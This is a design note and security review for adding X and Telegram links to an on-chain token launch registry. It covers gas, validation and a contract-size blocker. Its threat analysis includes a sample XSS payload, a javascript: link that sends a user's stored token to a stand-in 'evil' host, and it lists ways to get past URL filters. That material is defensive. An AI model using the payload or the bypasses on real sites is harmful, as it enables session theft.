# Three links on a launch record — design note

Owner decision, 2026-09-20: a launch must carry **website, X and Telegram**, so a token page can
be shared and a buyer can find the project.

Status: implemented in source, **not deployed anywhere**. `DeepCoreLaunchRegistry` is redeployed by
this change and `LaunchpadKitV2` takes the registry as an immutable constructor argument, so the
kit is redeployed with it. That is why this lands before Base: afterwards the same change costs a
second registry (launch history split across two contracts) or one social link forever.

> **Outcome, 2026-09-24 — the five-field shape in §1 did NOT ship; §9's blocker decided it.**
> What is in source (`src/IDeepCoreLaunchRegistry.sol`) is EXACTLY four `string` members:
> `description`, `websiteURI`, `xHandle`, `telegramHandle`. `socialURI` was replaced as §2 argues,
> but the links are HANDLES rather than URLs (stored without the leading `@`, validated on chain to
> `[A-Za-z0-9_]`, max 15 bytes for X and 32 for Telegram, `""` = not given; the SDK renders
> `https://x.com/<h>` / `https://t.me/<h>` via `xUrlOf` / `telegramUrlOf`, `null` for anything
> non-conforming), and **`iconURI` was dropped** to pay for them — the icon now belongs to the
> launch token's `metadataURI` or a token list. Kit runtime 23,988 B (+588). The struct must stay
> four `string`s: a fifth member, or a `bytes32` in place of a `string`, costs the kit ~900 bytes
> and breaks EIP-170. Everything below §1 is the design record as it was argued; read it with this
> outcome in mind.

---

## 1. What changes

`LaunchMetadata` (`src/IDeepCoreLaunchRegistry.sol`) goes from four fields to five:

```diff
 struct LaunchMetadata {
     string description;
     string websiteURI;
     string iconURI;
-    string socialURI;
+    string xURI;
+    string telegramURI;
 }
```

Everything else follows mechanically:

| Where | Change |
|---|---|
| `LaunchMetadataUpdated` event | `socialURI` → `xURI`, `telegramURI` (one more non-indexed string) |
| `_validateLaunchMetadata` | one more `_boundString(..., MAX_URI_BYTES)` |
| `_writeLaunchMetadata` | one more assignment |
| `_emitLaunchMetadata` | one more argument |
| `LaunchpadKitV2` | **no source change** — `LaunchParamsV2.listing` is a pass-through to `registerLaunch` (`LaunchLegs.sol:192`). It is redeployed only because its `createLaunch` ABI contains the struct and because the registry address is an immutable. **But its RUNTIME SIZE moves, and it moves over EIP-170 — see §9.** |

`LaunchpadMetadata` (the launchpad's own listing) is deliberately **not** touched. It is a
developer-facing record whose load-bearing fields are `sourceURI` and `auditURI`; nobody shares a
launchpad listing on X. Adding social links there would be scope creep with its own gas bill.

## 2. Replace `socialURI`, or keep it and add two?

Replace. Nothing is deployed, so there is no migration and no compatibility argument for keeping a
field whose only job the two new ones do better. Keeping all three would leave every consumer
having to decide which of `socialURI` and `xURI` wins when they disagree — a rule nobody would
write down and every front end would resolve differently.

## 3. The existing comment said "one canonical social link". Does this violate it?

No, and the distinction is worth stating because it is the rule that decides the next field too.

> *"One canonical social link. A list would be an unbounded write paid for by everyone who ever
> reads the record."*

The objection is to an **unbounded** structure: a `string[]` makes the per-record cost a function
of attacker-chosen `n`, and every full read of the record — `launchOf`, a paged marketplace query,
an event decode — pays for whatever the registrant chose to push. Two **named** fields have none
of that property. The cost is fixed at compile time, it is paid once at launch, and a reader's
cost does not move.

So: named fields are consistent with the comment's own reasoning; a list is what it forbids. The
comment is updated to say that explicitly, so the next person does not read "one canonical social
link" as a ban on the thing we just did.

## 4. A fourth generic slot (Discord, Farcaster, …)?

**No.** Recommended against, and the reasoning is the same rule one step further.

A generic `otherURI` is a field with no type. A consumer cannot render it — it does not know
whether to draw a Discord glyph, a Farcaster glyph or a bare link, so in practice it renders as
"another link", which is the one thing a project page does not need. And the field is a standing
invitation: once `otherURI` exists, the next request is `otherURI2`, which is a list with extra
steps and a worse encoding.

The honest ways to carry an open-ended set, when one is actually wanted:

- put it behind `websiteURI` (a project's own site can link anywhere), or
- a **later, separate** contract that maps `poolId → arbitrary links`, opted into by the consumers
  that want it, paid for by the records that use it, and not in the swap-adjacent index every
  marketplace reads.

Three named links answer the question that was asked. A fourth slot answers a question nobody
asked and charges every launch for it.

## 5. Storage layout and gas

`metadata` is the **last** member of `LaunchRecord`, so the new field appends. Nothing before it
moves. Each `string` occupies one slot (in place when ≤ 31 bytes, otherwise a length word plus a
`keccak`-derived data region). Records live in a `mapping(bytes32 => LaunchRecord)`, so there is no
array-stride effect either.

Measured directly (`gasleft()` either side of the call, registry unit fixture, default profile),
one `registerLaunch` on a cold record:

| metadata | before (4 fields) | after (5 fields) | delta |
|---|---|---|---|
| everything empty | 450,030 | 453,429 | **+3,399** |
| description, website, icon + **one** social link | 480,927 | 484,328 | **+3,401** |
| description, website, icon + **X and Telegram** | — | 504,974 | **+24,047** vs the row above |

`updateLaunchMetadata` rewriting the same values: 55,268 → 58,699 (**+3,431**).

Read those rows for what they are, because the first two and the third answer different questions.

- **+3,399 is the floor, and everyone pays it**, including a launch that fills neither new field.
  Solidity writes the member unconditionally, so it is one extra `SSTORE` to an already-zero cold
  slot (2,100 + 100), one extra ABI offset and length word of calldata (~256), and three extra
  words in the `LaunchMetadataUpdated` log (~768), plus decode overhead.
- **+24,047 is what a project that actually fills both links pays** relative to filling one: the
  floor above plus a zero→non-zero `SSTORE` (20,000) and the calldata for the string.

So the honest sentence is: *a launch that carries both X and Telegram costs about 24k more gas
than one that carried a single social link, and a launch that carries neither costs about 3.4k
more than before.* Against a `createLaunch` that already spends millions of gas, on Base at
0.05 gwei, both are a fraction of a cent. Nobody is priced out by this; it is recorded because
somebody pays it and the number should be written down rather than waved at.

**Kit runtime size:** `LaunchpadKitV2` is unchanged in SOURCE but **not** unchanged in size, and
that is the blocker — see §9.

## 6. Validation: what the contract refuses, and what it refuses to pretend

**The contract bounds length and checks nothing else.** Every field is capped at `MAX_URI_BYTES`
(512), the same bound `websiteURI` and `iconURI` already carry, and `StringTooLong` is the same
error. Empty is legal: all three links are optional.

Things a hostile registrant can still put in these fields, and where each is handled:

| Attack | Why not on chain | Who must handle it |
|---|---|---|
| `javascript:` / `data:` / `vbscript:` URI in an `href` → XSS | A prefix check is a *partial* filter. It is bypassed by case (`JaVaScRiPt:`), by leading whitespace and control bytes, by percent-encoding, and by an `https://` URL that a consumer later joins or unwraps. Worse, the filter's real cost is that it tells a front-end author the registry sanitises — and a front end that believes that stops allowlisting. | Consumer: allowlist the scheme (`https:` and, for `iconURI`, `ipfs:`/`ar:` if it resolves them), never pass through `javascript:`/`data:`. |
| Homoglyph / lookalike domain (`x.com` vs `х.com` with Cyrillic х) | Unicode normalisation and confusable tables on chain are absurd; and the check that matters — *is this domain the project's?* — is not a string property at all. | Consumer: render punycode, or render the host in a font/treatment where the substitution shows. Curators and guardians already have `Listing` for the cases that are actually fraud. |
| Embedded control bytes, `\n`, bidi overrides (`U+202E`) that reorder displayed text | Scanning 512 bytes × 4 fields on every launch buys a filter that only covers the ASCII control range unless we also parse UTF-8 — and the bidi characters that do the damage are multi-byte, so an ASCII-only scan misses exactly the attack it was bought for. | Consumer: escape on render; strip or visibly mark bidi controls. |
| A 512-byte link that breaks a layout | The bound is already the mitigation for "unbounded"; the remaining 512 is a display problem. | Consumer: truncate with the full value in `title`/on hover. |
| A real `https://` link to a phishing site | Unknowable on chain by construction. | Consumer + curators. `Listing.Malicious` exists for this. |

The one-line rule, and it is the same one `iconURI` already carried: **the registry records what
it cannot prove and marks it as unproven; it never launders it.** A contract cannot make a URL
safe to render, and validation that looks like safety without being safety is worse than none,
because it moves the check to the layer that cannot perform it.

If the owner does want an on-chain scheme check anyway, the place for it is an SDK/front-end
validator or an off-chain policy, not an immutable revert in a registry that must still be
accepting links in five years when the scheme list has moved.

## 7. What a consumer MUST do

Written into the struct's doc comments so it travels with the ABI:

1. **Never** render any of these in an `href`, `src`, `action` or `window.open` without first
   allowlisting the scheme. `https:` for `websiteURI`/`xURI`/`telegramURI`.
2. **Proxy** `iconURI`; never hotlink it. (Pre-existing rule, unchanged.)
3. `rel="noopener noreferrer"` and `target="_blank"` on every outbound link.
4. Escape on render; do not trust the string to be free of control or bidi characters.
5. Truncate for display.
6. Do not let any of these sit next to a verification badge as though the badge covered them. It
   covers the launchpad, never the free text.
7. Do not infer identity from the link. `xURI` is whoever the registrant typed; it is not proof
   that the account is the project's, and there is no oracle that could make it one.

---

## 8. Security review

Scope: `LaunchMetadata`, `_validateLaunchMetadata`, `_writeLaunchMetadata`, `_emitLaunchMetadata`,
`LaunchMetadataUpdated`, and the kit's pass-through at `LaunchLegs.sol:192`. Nothing about access
control, provenance, pool proof or the launchpad ladder is touched by this change, and none of
those paths reads a metadata field — `setLaunchpadVerification` reads `sourceURI`/`auditURI` on the
*launchpad* record, which is a different struct and is unchanged.

**No new privileged role, no new external function, no change to who may write what.**
`registerLaunch` is permissionless as before; `updateLaunchMetadata` is steward-or-curator as
before.

### R-1 — Informational (accepted by design): three attacker-controlled URIs, validated for length only

**Why it matters.** `registerLaunch` is open to anyone. Every string in `LaunchMetadata` is
whatever a stranger typed, and front ends render it. The change takes the count of renderable
URIs from three (website, icon, social) to four (website, icon, X, Telegram).

**Attack scenario.** A registrant indexes somebody else's real pool — registration does not
require ownership of anything — with `xURI = "javascript:fetch('//evil/'+localStorage.token)"`.
A marketplace that writes the value into an `href` executes it on its own origin when a user
clicks the X icon. Same value in `websiteURI` today; this is not a new class, it is a wider one.

**Affected code.** `IDeepCoreLaunchRegistry.sol` `LaunchMetadata`; `DeepCoreLaunchRegistry.sol`
`_validateLaunchMetadata`.

**Decision.** Not fixed on chain, deliberately — §6 is the argument in full. In short: a scheme
filter here is bypassable and, worse, persuades the layer that *can* do the check that it does not
need to. **Fixed in documentation instead**, in the struct's own header so it travels with the
ABI, and asserted by `test_links_hostileContentIsStoredNotRefused` so a later "tightening" is a
conscious act.

**Residual risk, stated rather than closed.** The registry is only as safe as its consumers.
`apps/web` is out of this change's scope; whoever lands the UI side owes the allowlist. This
finding is not closed until a front end proves it refuses `javascript:` and `data:`.

### R-2 — Informational (accepted): an X link next to a verification badge reads as endorsement

**Why it matters.** A verified launchpad badge is the registry's only trust signal. A reader who
sees a badge and an X handle on the same card will read the badge as covering the handle.

**Attack scenario.** A launch attributed to a verified launchpad sets `xURI` to a lookalike
account. Nothing in the record is false — the attribution IS proven — but the handle is not.

**Decision.** Not solvable on chain (a homoglyph domain and the real one are both just strings).
Handled by consumer rule 6, by `Listing.Malicious` which guardians can already set on a launch,
and by the steward/curator repair path that already exists for squatted listings.

### R-3 — Low (must not be skipped): ABI-mismatched consumers decode garbage, not an error

**Why it matters.** This is the sharpest practical risk of the change, and it is off chain.
`LaunchMetadata` goes from four dynamic members to five. A consumer holding the OLD ABI that
decodes the NEW `getLaunch` return or the NEW `LaunchMetadataUpdated` log does not get a clean
failure — dynamic-tuple offsets shift, so it reads a plausible-looking wrong string or reverts,
depending on the decoder. And the encode direction is worse: an old SDK building `createLaunch`
calldata against the new kit produces a tuple the new contract mis-parses, which at best reverts
and at worst writes a description into a link field.

**Affected code, all OUT of this change's scope and all requiring a lockstep update:**
`packages/sdk/src/registry/generated/abi.ts`, `packages/sdk/src/launchpad/generated/abi.ts`,
`packages/sdk/src/launchpad/kitV2/{build,reads}.ts` and their vitest vectors,
`apps/api/src/chain/abis.ts`, the three `apps/web` launch screens and `token/About.tsx`,
`packages/create-deepcore-app/template/**`, `docs/devnet/devnet-seed.mjs`,
`ops/fork-campaign/{artifacts,src/phases}/launchregistry*`.

**Recommended fix.** Regenerate every ABI from this source in the same change set that deploys it,
and do not deploy the registry ahead of the consumers. There is no on-chain mitigation and no
migration to get wrong, because nothing is deployed — which is exactly why this lands before Base.

### R-4 — Low: a partial edit silently clears a link

**Why it matters.** `updateLaunchMetadata` REPLACES the whole struct; it has no per-field setter.
A front end that sends only the field the user edited blanks the other four.

**Attack scenario.** Not an attack — an own goal. A project edits its description six months after
launch through a UI that did not read the current record first, and its X and Telegram links
vanish from every marketplace at once.

**Affected code.** `DeepCoreLaunchRegistry.updateLaunchMetadata`. Pre-existing semantics; the change
adds one more field to lose.

**Decision.** Not fixed on chain. Per-field setters would be five more external functions and five
more events for a problem the caller creates, and the replace-the-struct semantics are what make
`LaunchMetadataUpdated` a complete snapshot an indexer can trust without reading storage — which is
worth more. Fixed by documentation and by the SDK doing read-modify-write. Covered positively by
`test_links_mayBeClearedToEmpty`, which pins that an intentional clear DOES work.

### R-5 — Informational: the per-record cost is not a per-reader cost

**Checked rather than assumed.** The worry behind the original "one canonical social link" comment
was that a bigger record is paid for by everyone who reads it. It is not, in this registry: every
paging view (`listLaunches`, `launchesOfToken`, `launchesOfLaunchpad`, `launchesOfCreator`) returns
`bytes32[]` pool ids, never `LaunchRecord[]`. The only call that materialises a record's strings is
`getLaunch`, one record at a time. So the extra field costs one writer once and one reader per
record read — it does not scale with the size of the index, and it cannot be used to make a
marketplace's paged query run out of gas.

### R-6 — Informational: maximum calldata per launch grows by 512 bytes

Five fields at `MAX_URI_BYTES`/`MAX_DESCRIPTION_BYTES` is at most 2,048 + 4 × 512 = 4,096 bytes of
string payload, up from 3,584. It is paid entirely by the registrant, it does not affect anyone
else's transaction, and the kit's `createLaunch` already carries a leg array whose size dominates.
No DoS vector: there is no loop over metadata, no unbounded copy, and the record is per-`poolId` in
a mapping.

### What is explicitly NOT claimed

This change does not make any string in this struct safe to render. It makes three of them
*named*, so a consumer knows which glyph to draw, and it writes down what the consumer still has
to do. The contract's guarantee is exactly the length bound and nothing else.

---

## 9. BLOCKER — the fifth field pushes `LaunchpadKitV2` over EIP-170

**This change cannot ship as written.** Measured, not inferred, with a controlled A/B: the same
`forge build --sizes` in `packages/launchpad`, default profile, run twice — once at HEAD with the
working tree reverted, once with this change applied — with no other source difference.

| | `LaunchpadKitV2` runtime | margin to 24,576 |
|---|---|---|
| HEAD, unmodified | 23,988 B | **+588** |
| with `xURI` + `telegramURI` | 24,971 B | **−395** |

**+983 bytes for one `string`.** The kit's source does not change at all; the growth is the code
solc emits to validate and re-encode one more dynamic member of the deeply nested
`LaunchParamsV2` calldata struct in `createLaunch`. The 588 bytes of headroom CLAUDE.md records
were not enough, and they were never going to be — the headroom figure is the whole budget for
any ABI change to this struct, not a per-field allowance.

**Consequence.** EIP-170 is consensus, so the kit cannot be deployed on any chain. `forge build`
reports it and `script/DeployLaunchpadKitV2.s.sol:307` asserts `code.length <= 24_576` and would
refuse to broadcast.

**And the in-EVM suite does NOT catch it.** Verified, because this is the part that would bite
somebody later: with the change applied, `test_CL_oneLegBornAtZeroLockedAndRegistered` — which
deploys the kit and runs a whole launch through it — **passes**. Forge's test EVM does not enforce
the code-size limit by default, so a green suite says nothing about deployability here. The only
two things that see this are `forge build --sizes` and the deploy script's own assertion. Treat
the size check as part of the acceptance bar for any ABI change to `LaunchParamsV2`, not as a
build warning.

Two contracts are over the limit in this package at HEAD already — `BinPoolManager` (−2,359) and
`UniversalRouter` (−1,853). Those are **pre-existing and not a concern here**: they are
dependencies compiled at this package's 1,000,000 runs for the test build, and they ship from
their own packages under their own profiles. The kit is different: this package's profile IS how
the kit is built and deployed.

**What is NOT the fix.** Lowering the kit's `optimizer_runs` below 9,000, deleting an unrelated
feature, or trimming another contract to buy room. That trades a deployment constraint for a gas
cost or a product cost, silently, and it is exactly the shave this change must not perform.

**Options, for the owner rather than for me.** Each changes the shape of the kit or the launch
flow, so each is a decision, not a refactor:

1. **Take `listing` out of `LaunchParamsV2` entirely.** `createLaunch` stops carrying metadata;
   the registry record is written with empty free text and `launchSteward` sets the links in a
   second transaction through `updateLaunchMetadata`. This almost certainly makes the kit
   *smaller* than 23,988, because it removes the nested struct from `createLaunch`'s ABI. Costs:
   a second transaction per launch, and a window in which the record exists with no links.
2. **Move more of `createLaunch` into `LaunchLegs`.** The library split already exists for exactly
   this reason (the kit alone was 42.9 KB). Whether 983 bytes can be pushed across the
   `delegatecall` boundary needs measuring, not guessing.
3. **Three links, one fewer field.** e.g. fold `description` out of the on-chain struct. Changes
   what the index carries; probably worse than (1).
4. **Ship the registry change now and the kit change later**, accepting that the kit's
   `createLaunch` keeps the 4-field struct until one of the above lands. **This does not work as
   stated** — the kit imports the struct from the registry, so they move together by compilation.
   It would need a kit-local struct and a translation, which is a worse version of (1).

Recommendation: option 1, measured first. It is the only one that plausibly leaves headroom rather
than consuming the last of it, and it removes this whole class of problem — the kit stops being
coupled to the registry's metadata shape, so the next field costs nothing at all on the kit side.
